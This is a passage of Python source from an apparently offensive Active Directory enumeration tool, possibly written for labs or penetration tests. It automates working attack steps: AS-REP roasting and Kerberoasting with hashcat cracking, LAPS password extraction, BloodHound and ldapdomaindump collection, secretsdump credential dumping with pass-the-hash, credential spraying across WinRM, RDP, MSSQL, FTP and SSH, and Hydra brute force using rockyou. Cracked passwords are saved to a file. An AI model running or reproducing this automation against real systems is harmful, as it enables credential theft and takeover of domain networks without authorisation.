            hf.write_text("\n".join(self.asrep_hashes) + "\n", encoding="utf-8")
            self._warn(f"AS-REP: {len(self.asrep_hashes)} hash(es) → asrep.hash")
            self._crack_hashes(str(hf), 18200, "asrep")
        else:
            self._dim("No AS-REP vulnerable accounts (all require pre-auth)")

    # ─────────────────────────────────────────── Kerberoasting

    def _kerberoast(self, cred: ADCred):
        dc = self.dc_ip
        if not dc or not cred.has_auth:
            return
        if not _find("nxc"):
            return
        dom_args = ["--domain", self.domain] if self.domain else []
        lbl = f"nxc ldap kerberoast {dc}"
        if not self._done(lbl):
            self._run(
                ["nxc", "ldap", dc] + cred.nxc_auth(include_local=False) +
                dom_args + ["--kerberoasting", "kerb.hash"],
                label=lbl, timeout=90,
            )
        if Path("kerb.hash").exists():
            self.kerb_hashes = [
                ln.strip() for ln in Path("kerb.hash").read_text(
                    errors="replace").splitlines()
                if ln.strip().startswith("$krb5tgs$")
            ]
        if self.kerb_hashes:
            self._warn(f"Kerberoast: {len(self.kerb_hashes)} hash(es) → kerb.hash")
            self._crack_hashes("kerb.hash", 13100, "kerb")
        else:
            self._dim("No Kerberoast hashes found")

    # ─────────────────────────────────────────── LAPS

    def _run_laps(self, cred: ADCred):
        if not cred.has_auth or not _find("nxc"):
            return
        dom_args = ["-d", self.domain] if self.domain else []
        for ip in self.ips:
            lbl = f"nxc laps {ip}"
            if not self._done(lbl):
                self._run(
                    ["nxc", "ldap", ip] + cred.nxc_auth(include_local=False) +
                    dom_args + ["-M", "laps"],
                    label=lbl, timeout=30,
                )
            out = self._out(lbl)
            for m in re.finditer(r"ms-mcs-admpwd[^:]*:\s*([^\s,\]]+)", out, re.I):
                pw = m.group(1).strip()
                if pw and pw not in ("None", ""):
                    host = self.session.hosts.get(ip)
                    label_str = (host.display_name if host else ip)
                    entry = (label_str, pw)
                    if entry not in self.laps_passwords:
                        self.laps_passwords.append(entry)
                        self._warn(f"LAPS: {label_str} → {pw}")

    # ─────────────────────────────────────────── ldapdomaindump

    def _run_ldapdomaindump(self, cred: ADCred):
        dc = self.dc_ip
        if not dc or not cred.has_auth:
            return
        if not _find("ldapdomaindump"):
            self._dim("ldapdomaindump not found — skipping")
            return
        if cred.is_pth:
            self._dim("ldapdomaindump: PTH not supported — skipping")
            return
        out_dir = self._user_dir(cred) / "ldapbooks"
        out_dir.mkdir(parents=True, exist_ok=True)
        dom = self.domain or ""
        user_str = f"{dom}\\{cred.username}" if dom else cred.username
        lbl = f"ldapdomaindump {dc}"
        if not self._done(lbl):
            self._run([
                "ldapdomaindump",
                "-u", user_str, "-p", cred.password,
                dc, "-o", str(out_dir),
            ], label=lbl, timeout=120)
        self._dim(f"→ {out_dir}/")

    # ─────────────────────────────────────────── BloodHound

    def _run_bloodhound(self, cred: ADCred):
        dc = self.dc_ip
        if not dc or not cred.has_auth or not self.domain:
            return
        if not _find("bloodhound-python"):
            self._dim("bloodhound-python not found — skipping")
            return
        # Collect raw JSON (no --zip) under <user>/adenum/ so the loot is grep-able:
        #   cat <user>/adenum/*_users.json | jq -r '.data[].Properties.name'
        out_dir = self._user_dir(cred) / "adenum"
        out_dir.mkdir(parents=True, exist_ok=True)
        lbl = f"bloodhound-python {dc}"
        if not self._done(lbl):
            cmd = [
                "bloodhound-python",
                "-u", cred.username,
                "-d", self.domain,
                "-dc", self._dc_fqdn(),
                "-ns", dc,
                "-c", "ALL",
            ]
            if cred.is_pth:
                cmd += ["--hashes", f":{cred.ntlm}"]
            else:
                cmd += ["-p", cred.password]
            self._run(cmd, label=lbl, timeout=300, cwd=out_dir)
        self._dim(f"→ {out_dir}/")

    # ─────────────────────────────────────────── secretsdump

    def _run_secretsdump(self, cred: ADCred):
        if not cred.has_auth or not _find("impacket-secretsdump"):
            return
        dom = self.domain or ""
        for ip in self.ips:
            lbl = f"secretsdump {ip}"
            if not self._done(lbl):
                if cred.is_pth:
                    cmd = [
                        "impacket-secretsdump",
                        f"{dom}/{cred.username}@{ip}",
                        "-hashes", f":{cred.ntlm}",
                    ]
                else:
                    cmd = ["impacket-secretsdump", cred.impacket_target(ip)]
                self._run(cmd, label=lbl, timeout=120)

    # ─────────────────────────────────────────── SMB shares (authenticated)

    def _smb_shares_auth(self):
        if not self.valid_creds or not _find("nxc"):
            return
        seen_keys: set[tuple] = set()
        for cred in self._unique_creds():
            if not cred.has_auth:
                continue
            for ip in self.ips:
                host = self.session.hosts.get(ip)
                if not host or not (set(host.open_ports) & {139, 445}):
                    continue
                key = (cred.username, cred.password or cred.ntlm, ip, cred.local_auth)
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                lbl = f"SMB shares {cred.username}@{ip}"
                if self._done(lbl):
                    continue
                self._run(
                    ["nxc", "smb", ip] + cred.nxc_auth() + ["--shares"],
                    label=lbl, timeout=30,
                )

    # ─────────────────────────────────────────── protocol auth matrix

    def _auth_matrix(self):
        """Test valid credentials against all open protocols on every IP."""
        if not self.valid_creds or not _find("nxc"):
            return
        proto_ports = {
            "winrm":  {5985, 5986},
            "rdp":    {3389},
            "mssql":  {1433},
            "ftp":    {21},
            "ssh":    {22},
        }
        for ip in self.ips:
            host = self.session.hosts.get(ip)
            if not host:
                continue
            open_p = set(host.open_ports)
            for cred in self._unique_creds():
                if not cred.has_auth:
                    continue
                for proto, ports in proto_ports.items():
                    if not (open_p & ports):
                        continue
                    lbl = f"{proto.upper()} auth {cred.username}@{ip}"
                    if self._done(lbl):
                        continue
                    cmd = ["nxc", proto, ip] + cred.nxc_auth()
                    self._run(cmd, label=lbl, timeout=20)
                    self._parse_spray(self._out(lbl), is_ntlm=cred.is_pth,
                                     local_auth=cred.local_auth)

    # ─────────────────────────────────────────── Hydra brute force

    def _run_hydra(self):
        if not _find("hydra"):
            self._dim("hydra not found — skipping")
            return

        tmps: list[str] = []

        def _tmp(values: list[str]) -> str:
            if len(values) == 1:
                return values[0]
            f = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            f.write("\n".join(values))
            f.close()
            tmps.append(f.name)
            return f.name

        # Resolve password source: user-supplied list or rockyou
        if self.passwords:
            pass_src = self.passwords
        else:
            wl = _wordlist("/usr/share/wordlists/rockyou.txt")
            pass_src = [wl] if wl else []
        if not pass_src:
            self._dim("No password source for hydra — skipping")
            return

        try:
            user_file = _tmp(self.usernames)
            pass_file = _tmp(pass_src)

            for ip in self.ips:
                host = self.session.hosts.get(ip)
                if not host:
                    continue
                open_p = set(host.open_ports)
                for proto, port in [("ftp", 21), ("ssh", 22)]:
                    if port not in open_p:
                        continue
                    lbl = f"hydra {proto} {ip}"
                    if self._done(lbl):
                        continue
                    self._run([
                        "hydra", "-L", user_file, "-P", pass_file,
                        "-t", "4", "-f", "-q",
                        f"{proto}://{ip}",
                    ], label=lbl, timeout=300)
        finally:
            for f in tmps:
                try:
                    os.unlink(f)
                except OSError:
                    pass

    # ─────────────────────────────────────────── hash cracking

    def _crack_hashes(self, hash_file: str, mode: int, label: str):
        if not _find("hashcat") or not Path(hash_file).exists():
            return
        wl = "/usr/share/wordlists/rockyou.txt"
        if not Path(wl).exists():
            return
        lbl = f"hashcat {mode} {label}"
        if not self._done(lbl):
            self._run(
                ["hashcat", "-m", str(mode), "-a", "0", hash_file, wl,
                 "--potfile-disable", "--quiet"],
                label=lbl, timeout=300,
            )
        out = self._out(lbl)
        cracked = [ln.strip() for ln in out.splitlines()
                   if ":" in ln and not ln.startswith("#") and ln.strip()]
        if cracked:
            self._ok(f"{len(cracked)} hash(es) cracked (hashcat -m {mode})")
            for ln in cracked[:5]:
                self.console.print(f"    [dim #7aab7a]{ln}[/dim #7aab7a]")
            passwords = [ln.split(":")[-1] for ln in cracked if ":" in ln]
            if passwords:
                added = _merge_list(Path("passwords.txt"), passwords)
                if added:
                    self._dim(f"↳ passwords.txt (+{added})")

    # ─────────────────────────────────────────── output helpers

    def _write_users_txt(self):
        if not self.users:
            return
        added = _merge_list(Path("users.txt"), self.users)
        self._dim(f"users.txt (+{added}) — {len(self.users)} total")

    # ─────────────────────────────────────────── parsers

    def _parse_rpcclient_users(self, output: str):
        for m in re.finditer(r"user:\[([^\]]+)\]", output):
            u = m.group(1).strip()
            if u:
                self.users.append(u)

    def _parse_nxc_rid(self, output: str):
        for ln in output.splitlines():
            if "SidTypeUser" in ln:
                m = re.search(r"\\([\w\.\-]+)\s+SidTypeUser", ln)
                if m:
                    self.users.append(m.group(1).strip())

    def _parse_nxc_ldap_users(self, output: str):
        for ln in output.splitlines():
            if not ln.strip() or any(x in ln for x in ("[*]", "[+]", "[-]")):
                continue
            parts = ln.split()
            if len(parts) >= 5:
                candidate = parts[4].strip()
                if (candidate and not candidate.startswith("[")
                        and candidate not in ("Username", "badpwdcount", "badpwdtime")):
                    self.users.append(candidate)

    def _parse_nxc_users_auth(self, output: str):
        for ln in output.splitlines():
            m = re.search(r"\[\*\]\s+([\w\.\-]+)\s+\(", ln)
            if m:
                self.users.append(m.group(1))
            m2 = re.search(r"^\S+\s+\S+\s+\d+\s+\S+\s+([\w\.\-]+)\s+", ln)
            if m2 and not ln.strip().startswith("["):
                candidate = m2.group(1)
                if candidate and candidate not in ("SMB", "LDAP", "Username"):
                    self.users.append(candidate)

    def _dedup_users(self):
        seen: set[str] = set()
        result = []
        for u in self.users:
            ul = u.lower().strip()
            if ul and ul not in seen:
                seen.add(ul)
                result.append(u)
        self.users = result

    # ─────────────────────────────────────────── progressive report

    def save_report(self):
        # Persist the session db on every phase so an interrupted run
        # (Ctrl-C, lab timeout) still resumes without re-scanning.
        if self.persist:
            try:
                from . import sessiondb
                sessiondb.save(self.session, "2.2.0", full_history=True)
            except Exception:
                pass
        if self.no_report:
            return
        try:
            from .report import ADReport
            ADReport(self.console, self.session, self).generate(quiet=True)
            self.console.print(
                "  [dim #656d76]  📄 adenum.html updated[/dim #656d76]"
            )
        except Exception as e:
            self._dim(f"report error: {e}")
